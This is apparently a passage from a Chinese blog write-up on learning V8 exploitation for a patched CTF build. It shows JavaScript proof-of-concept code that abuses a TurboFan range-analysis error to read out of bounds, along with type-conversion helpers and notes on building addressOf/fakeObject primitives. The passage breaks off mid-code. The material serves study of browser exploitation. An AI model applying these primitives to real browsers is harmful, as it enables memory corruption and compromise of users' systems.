<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function f(x)</span><br><span class="line">&#123;</span><br><span class="line">    const arr = [1.1, 2.2, 3.3, 4.4, 5.5]; // length =&gt; Range(5, 5)</span><br><span class="line">    let t = (x == 1 ? 9007199254740992 : 9007199254740989);</span><br><span class="line">    </span><br><span class="line">    t = t + 1 + 1;</span><br><span class="line">    /*  t =&gt; </span><br><span class="line">        Range(9007199254740991, 9007199254740992)</span><br><span class="line">        but Range(9007199254740991, 9007199254740994)</span><br><span class="line">    */</span><br><span class="line">    t -= 9007199254740989;</span><br><span class="line">    /*  t =&gt; </span><br><span class="line">        Range(2, 3)</span><br><span class="line">        but Range(2, 5)</span><br><span class="line">    */</span><br><span class="line">    return arr[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(f(1));</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line">console.log(f(1));</span><br></pre></td></tr></table></figure>

<p><img src="/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251204045753268.png" alt="image-20251204045753268"></p>
<p>可以看到第一次未被优化时访问的实际时arr[3]，强制优化后因为TurboFan认为t最大值是3 Range(2, 3)，小于arr的最小值Range(5,5)</p>
<p>所以将checkBounds去掉了，然而patch在SimplifiedLoweringPhase阶段加的优化实际会将t变成5，也就造成了数组越界</p>
<p>可以看到checkBounds在SimplifiedLoweringPhase阶段被优化掉了</p>
<p><img src="/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251204050741195.png" alt="image-20251204050741195"></p>
<p>优化掉之前</p>
<p><img src="/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251204050912649.png" alt="image-20251204050912649"></p>
<p>优化掉之后</p>
<h4 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h4><p>数组越界感觉可以像上一题那样直接打，但是实际调试下来有%DebugPrint的时候double array obj array的elements确实和map是紧贴的，但是不用%DebugPrint的时候他们之间并不相邻，貌似是%DebugPrint扰乱了内存布局，感觉挺玄学的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8)</span><br><span class="line">    this.f64 = new Float64Array(this.buf)</span><br><span class="line">    this.f32 = new Float32Array(this.buf)</span><br><span class="line">    this.u32 = new Uint32Array(this.buf)</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf)</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf)</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;</span><br><span class="line">    this.i = 0</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ Debug Helpers ------------------ */</span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg)</span><br><span class="line">    %SystemBreak()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ Float &lt;-&gt; Int conversions ------------------ */</span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f64toi64(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i64tof64(i) &#123;</span><br><span class="line">    this.u64[0] = i</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → int64</span><br><span class="line">  f64toi64signed(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.i64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64</span><br><span class="line">  i64tof64signed(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f64toi32lo(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f64toi32hi(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u32[1]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64</span><br><span class="line">  i32pairtof64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i64to32lo(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i64to32hi(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.u32[1]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i</span><br><span class="line">    return this.f32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ Logging helpers ------------------ */</span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ GC / state ------------------ */</span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">helpers = new Helpers()</span><br><span class="line"></span><br><span class="line">function f(a) &#123;</span><br><span class="line">  let double_arr = [0.0, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];</span><br><span class="line">  let obj_arr = [&#123;&#125;];</span><br><span class="line">  let x = a == 0 ? 9007199254740989 : 9007199254740992;</span><br><span class="line">  let y = x + 1 + 1;</span><br><span class="line">  let z = y - 9007199254740991; // Range(0,1) but Range(0,3)</span><br><span class="line">  if (a != 0) &#123;</span><br><span class="line">    %DebugPrint(double_arr);</span><br><span class="line">    %DebugPrint(obj_arr);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i = 0; i &lt; 0x10000; i++)</span><br><span class="line">  f(0);</span><br><span class="line"></span><br><span class="line">f(1);</span><br><span class="line">helpers.stop();</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8)</span><br><span class="line">    this.f64 = new Float64Array(this.buf)</span><br><span class="line">    this.f32 = new Float32Array(this.buf)</span><br><span class="line">    this.u32 = new Uint32Array(this.buf)</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf)</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf)</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;</span><br><span class="line">    this.i = 0</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ Debug Helpers ------------------ */</span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg)</span><br><span class="line">    %SystemBreak()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ Float &lt;-&gt; Int conversions ------------------ */</span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f64toi64(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i64tof64(i) &#123;</span><br><span class="line">    this.u64[0] = i</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → int64</span><br><span class="line">  f64toi64signed(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.i64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64</span><br><span class="line">  i64tof64signed(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f64toi32lo(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f64toi32hi(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u32[1]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64</span><br><span class="line">  i32pairtof64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i64to32lo(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i64to32hi(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.u32[1]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i</span><br><span class="line">    return this.f32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ Logging helpers ------------------ */</span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ GC / state ------------------ */</span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">helpers = new Helpers()</span><br><span class="line"></span><br><span class="line">function f(x)</span><br><span class="line">&#123;</span><br><span class="line">    const float_array = [1.1, 2.2, 3.3, 4.4, 5.5];</span><br><span class="line">    let t = (x == 1 ? 9007199254740992 : 9007199254740989);</span><br><span class="line">    t = t + 1 + 1;</span><br><span class="line">    t -= 9007199254740989;</span><br><span class="line">    //if(x == 1)&#123;</span><br><span class="line">    //  %DebugPrint(float_array);</span><br><span class="line">    //&#125;</span><br><span class="line">    return float_array[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(f(1));</span><br><span class="line">for (let i = 0; i &lt; 100000000; i++)</span><br><span class="line">  f(0);</span><br><span class="line">float_map = helpers.f64toi64(f(1));</span><br><span class="line">helpers.printhex(float_map);</span><br><span class="line">console.log(f(1));</span><br></pre></td></tr></table></figure>

<p><img src="/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251204051408805.png" alt="image-20251204051408805"></p>
<p>0xdeadbeedbeadbeef肯定不是map，不过测试下来不过 <code>double_arr</code> 的 elements 始终在 <code>obj_arr</code> 的 elements 前面</p>
<p>那么可以通过越界double_arr读出obj_arr的elements，或者通过越界double_arr往obj_arr写一个地址然后通过obj_arr[idx]通过地址伪造出一个对象，也就是实现了addressOf和fakeObject，然后具体越界多少测的时候不能用%DebugPrint直接看elements，因为和实际利用的偏移不一样可以通过%DisassembleFunction(f)获得函数地址然后在在f函数加上一段对elements的操作(也就是访问数组元素)，在gdb中断点调试可以根据数组访问元素的相关汇编确定elements的地址然后算出偏移，实际算出是double_arr的idx为18时可以越界到obj_arr[0]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8);</span><br><span class="line">    this.f64 = new Float64Array(this.buf);</span><br><span class="line">    this.f32 = new Float32Array(this.buf);</span><br><span class="line">    this.u32 = new Uint32Array(this.buf);</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf);</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf);</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;;</span><br><span class="line">    this.i = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f2i(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i2f(x) &#123;</span><br><span class="line">    this.u64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int to hex string</span><br><span class="line">  hex(x) &#123;</span><br><span class="line">    return &quot;0x&quot; + x.toString(16);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to hex string</span><br><span class="line">  f2h(x) &#123;</span><br><span class="line">    return this.hex(this.f2i(x));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to aligned address (clear low 2 bits)</span><br><span class="line">  f2a(x) &#123;</span><br><span class="line">    return this.f2i(x) &gt;&gt; 2n &lt;&lt; 2n;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // address to float (set low bit)</span><br><span class="line">  a2f(x) &#123;</span><br><span class="line">    return this.i2f(x | 1n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → int64 (signed)</span><br><span class="line">  f2is(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.i64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64 (signed)</span><br><span class="line">  i2fs(x) &#123;</span><br><span class="line">    this.i64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f2lo(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f2hi(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[1];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64</span><br><span class="line">  i2f64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0;</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i2lo(i) &#123;</span><br><span class="line">    return 